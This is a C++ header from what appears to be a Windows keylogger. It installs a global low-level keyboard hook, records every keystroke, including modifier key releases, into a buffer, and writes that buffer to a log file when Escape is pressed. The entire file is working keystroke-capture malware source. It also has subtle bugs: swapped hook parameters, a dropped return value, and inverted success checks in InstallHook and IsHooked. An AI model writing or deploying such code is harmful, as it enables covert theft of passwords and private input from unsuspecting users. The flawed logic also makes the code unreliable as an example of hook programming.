#ifndef KEYBHOOK_H
#define KEYBHOOK_H
#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"

std::string keylog = "";

HHOOK eHook = NULL;

/*
  @Description: This is the function that writes our keystrokes to the log file.
  @lparam: keystroke info
  @wparam:
  @nCode:

*/
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode<0)
        CallNextHookEx(eHook, nCode, lparam, wparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;

        if(kbs->vkCode == VK_SPACE)
            keylog += ' ';

        if(kbs->vkCode == VK_RETURN)
            keylog += '\n';

        if(kbs->vkCode == VK_ESCAPE)
            IO::WriteLog(keylog);
    }
    if(wparam == WM_KEYUP || wparam  == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
                if (key == VK_CONTROL
                        || key == VK_LCONTROL
                        || key == VK_RCONTROL
                        || key == VK_SHIFT
                        || key == VK_LSHIFT
                        || key == VK_RSHIFT
                        || key == VK_MENU
                        || key == VK_LMENU
                        || key == VK_RMENU
                        || key == VK_CAPITAL
                        || key == VK_NUMLOCK
                        || key == VK_LWIN
                        || key == VK_RWIN)
                    {
                        string KeyName = Keys::KEYS[kbs->vkCode].Name;
                        KeyName.insert (1, "/");
                        keylog += '\n' + KeyName;
                    }
    }
    return CallNextHookEx(eHook, nCode,  wparam, lparam);
}

bool InstallHook()
    {
        Helper::WriteAppLog ("Hook started... Timer started");

        eHook = SetWindowsHookEx (WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle (NULL), 0);

        return eHook == NULL;
    }


bool UninstalHook ()
    {

        BOOL b = UnhookWindowsHookEx (eHook);
        eHook = NULL;
        return (bool)b;
    }

bool IsHooked ()
    {
        return (bool)(eHook == NULL);
    }


#endif
